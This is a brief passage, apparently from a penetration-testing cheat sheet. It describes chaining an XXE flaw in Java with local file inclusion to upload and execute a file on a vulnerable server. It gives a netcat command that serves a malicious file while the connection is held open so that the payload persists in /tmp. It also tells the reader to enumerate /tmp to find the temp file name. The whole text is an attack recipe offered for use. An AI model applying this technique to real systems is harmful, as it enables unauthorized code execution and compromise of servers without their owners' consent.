To upload a file using XXE with Java, upload the xxe.xml file to the vulnerable server, but don't close the connection. This can be done using nc as shown below. Until the connection closes, it will be stored as a temp file in /tmp. Use an LFI to execute the file.

nc -nlvp 8080 < evilFile

If you need to get the tmp file name that the upload is being stored as, use a second connection to send the contents of the /tmp directory.
